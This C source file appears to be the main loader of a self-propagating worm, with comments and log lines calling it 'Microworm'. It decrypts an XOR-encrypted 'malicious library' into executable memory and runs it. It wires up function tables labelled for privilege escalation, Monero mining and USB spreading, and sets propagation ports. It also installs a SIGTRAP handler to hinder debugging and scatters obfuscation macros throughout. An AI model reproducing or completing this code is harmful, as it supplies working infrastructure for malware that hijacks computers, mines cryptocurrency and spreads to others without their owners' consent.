#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>   // For sysconf
#include <dlfcn.h>    // For dlsym
#include <poll.h>
#include <time.h>

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <libgen.h>

#include "main/globals.h"
#include "main/utils.h"

void trap_handler(int signo, siginfo_t *info, void *context){
    return;
}

// xor a memory region with the given key and layer (layered xor-encryption logic)
void xor_memory_layered(void * memory, size_t len, char*key, int layer);
void encrypt_layered(void *memory, size_t len, char* key);
void decrypt_layered(void *memory, size_t len, char* key);

// Function pointer type for the embedded function
typedef void (*MaLibEntry)(Globals *);

void setup_library(MaLib **libp){
    <lib_setup>
}

int sleep_ms(unsigned int ms){
    return usleep(ms * 1000);
}

/// initialize pointers to the functions listed in struct globals (globals.h)
void init_globals(Globals *global){
    FOOLS;
    global->exit=&exit;
    global->sleep=&sleep;
    global->usleep=&usleep;
    global->sleep_ms=&sleep_ms;

    // strings
    global->getcwd=&getcwd;
    global->snprintf=&snprintf;
    global->fprintf=&fprintf;
    global->printf=&printf;
    global->strerror=&strerror;
    global->strlen=&strlen;
    global->strcmp=&strcmp;
    global->strstr=&strstr;
    global->strcpy=&strcpy;
    global->strncpy=&strncpy;
    global->sscanf=&sscanf;
    global->strtok=&strtok;
    global->strcat=&strcat;

    FOOLS;
    // memory
    global->memcpy = &memcpy;
    global->memset=&memset;
    global->calloc=&calloc;


    // functions used in lpe
    global->readlink=&readlink;
    global->geteuid=&geteuid;
    global->execve=&execve;
    global->fork=&fork;


    // files
    global->realpath=&realpath;
    global->fopen=&fopen;
    global->access=&access;
    global->fread=&fread;
    global->fseek=&fseek;
    global->ftell=&ftell;
    global->fclose=&fclose;
    global->fwrite=&fwrite;
    global->rewind=&rewind;
    global->open=&open;
    global->write=&write;
    global->close=&close;
    global->mkdir=&mkdir;
    global->opendir=&opendir;
    global->readdir=&readdir;
    global->closedir=&closedir;


    // errno
    global->__errno_location = &__errno_location;

    FOOLS;
    // heap
    global->malloc=&malloc;
    global->realloc=&realloc;
    global->free=&free;

    // network
    global->htonl=&htonl;
    global->htons=&htons;
    global->ntohl=&ntohl;
    global->ntohs=&ntohs;
    global->inet_ntoa=&inet_ntoa;
    global->inet_ntop=&inet_ntop;

    FOOLS;
    global->socket=&socket;
    global->setsockopt=&setsockopt;
    global->bind=&bind;
    global->listen=&listen;
    global->accept=&accept;
    global->getifaddrs=&getifaddrs;
    global->freeifaddrs=&freeifaddrs;
    global->getsockname=&getsockname;

    FOOLS;
    global->recv=&recv;
    global->send=&send;
    global->recvfrom=&recvfrom;
    global->sendto=&sendto;

    global->poll=&poll;
    global->ioctl=&ioctl;

    FOOLS;
    // threads
    global->pthread_create=&pthread_create;
    global->pthread_detach=&pthread_detach;
    global->pthread_exit=&pthread_exit;

    // fds
    global->stdout = stdout;
    global->stderr = stderr;

    // misc
    global->rand = &rand;

    FOOLS;
    // custom functions
    global->xor_memory_layered=&xor_memory_layered;
    global->encrypt_layered=&encrypt_layered;
    global->decrypt_layered=&decrypt_layered;

    FOOLS;
    // xmr functions
    global->popen=&popen;
    global->pclose=&pclose;
    global->fgets=&fgets;
    global->strncmp=&strncmp;
    global->ferror=&ferror;
    global->remove=&remove;
    global->dirname=&dirname;
    global->strdup=&strdup;
    global->system=&system;
    global->chmod=&chmod;
    global->execlp=&execlp;

    FOOLS;
    // usb functions
    global->lstat=&lstat;
    global->stat=&stat;
    global->atoi=&atoi;
    global->__strtok_r=&__strtok_r;
    global->execl=&execl;

    FOOLS;
    // global values
    global->propagation_server_port = 42024;
    global->ipp_server_port = 6969;
}

/// execute the code from a malicious library
void exec_malib(Globals *global, void*mem, uint64_t entry_offset, size_t mem_size){
    MaLibEntry lib_entry = (MaLibEntry)mem + entry_offset;
    FOOLS;
    lib_entry(global);
    munmap(mem, mem_size);
}

/// load a malicious library into memory and decrypt it
void * load_library(MaLib *lib){
    FOOLS;
    // Allocate memory for the executable code
    void *lib_mem = mmap(NULL, lib->data_length, PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (lib_mem == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    FOOLS;
    // Copy the byte array to the executable memory
    memcpy(lib_mem, lib->data, lib->data_length);
    decrypt_layered(lib_mem, lib->data_length, (char *)&lib->key);

    // linking GOT
    for(size_t i = 0; i < lib->n_got_mappings; i++){
        FOOLS;
        *(uint64_t *)(lib_mem + lib->got_offsets[i]) = (uint64_t) lib_mem + lib->got_targets[i];
    }

    return lib_mem;
}

/// load all malicious libraries into memory and execute them
void load_libraries(Globals *global){
    MaLib *lib = malloc(sizeof(MaLib));

    FOOLS;
    setup_library(&lib);

    DEBUG_LOG("🔑🔒🔑🔒🔑    0x%lx     🔑🔒🔑🔒🔑\n", lib->key);

    // load the library
    void* lib_mem = load_library(lib);
    global->lib_mem = lib_mem;
    global->lib = lib;

    // run the library code (entry)
    DEBUG_LOG("🦠🪱🐛🪱🐉 Microworm ready to eat you! 🐉🪱🐛🪱🦠\n");
    FOOLS;
    exec_malib(global, lib_mem, lib->entry_offset, lib->data_length);

    // free the library
    free(lib);
}

// Get filepath of executable itself
char* load_filepath(Globals *global, char*filename){
    FOOLS;
    global->malware_path = global->malloc(MAX_PATH_LEN);
    ASSERT(global->malware_path, "malloc");
    if(filename[0] == '/'){
        global->malware_path = filename;
        return global->malware_path;
    }
    char*cwd = global->getcwd(NULL, MAX_PATH_LEN - global->strlen(filename));
    ASSERT(cwd, "getcwd");
    global->snprintf(global->malware_path, MAX_PATH_LEN-1, "%s/%s", cwd, filename);
    global->free(cwd);
    global->realpath(filename, global->malware_path);

    return global->malware_path;
}
// xor a memory region with the given key and layer (layered xor-encryption logic)
void xor_memory_layered(void * memory, size_t len, char*key, int layer){
    unsigned char* mem = (unsigned char*) memory;
    size_t keylen = KEYLEN*sizeof(char);
    int ik = 0;
    for(int i=layer; i<len; i+=layer+1){
        FOOLS;
        char k = (char)key[ik%keylen];
        mem[i] ^= k;
        ik+=layer+1;
    }
}
void encrypt_layered(void *memory, size_t len, char* key){
    size_t keylen = KEYLEN*sizeof(char);
    for(int i=0; i<keylen; i++){
        FOOLS;
        xor_memory_layered(memory, len, key, i);
    }
}

void decrypt_layered(void *memory, size_t len, char* key){
    size_t keylen = KEYLEN*sizeof(char);
    for(int i=keylen-1; i>=0; i--){
        FOOLS;
        xor_memory_layered(memory, len, key, i);
    }
}

void setup_trap_handler(){
    struct sigaction trapSa;

    // setup trap signal handler
    trapSa.sa_flags = SA_SIGINFO;
    trapSa.sa_sigaction = trap_handler;
    int ret = sigaction(SIGTRAP, &trapSa, NULL);
    ASSERT(ret == 0, "setup trap handler");
}

int main(int argc, char**argv) {
    FOOLS;
    if(!DEBUG){
        setup_trap_handler();
    }

    // setup global variables and functions
    Globals *global = (Globals *) malloc(sizeof(Globals));
    srand(time(NULL));
    init_globals(global);

    FOOLS;
    // load the filepath of the executing binary
    load_filepath(global, argv[0]);

    FOOLS;
    // load and execute all provided malware-libraries
    load_libraries(global);
    return 0;
}
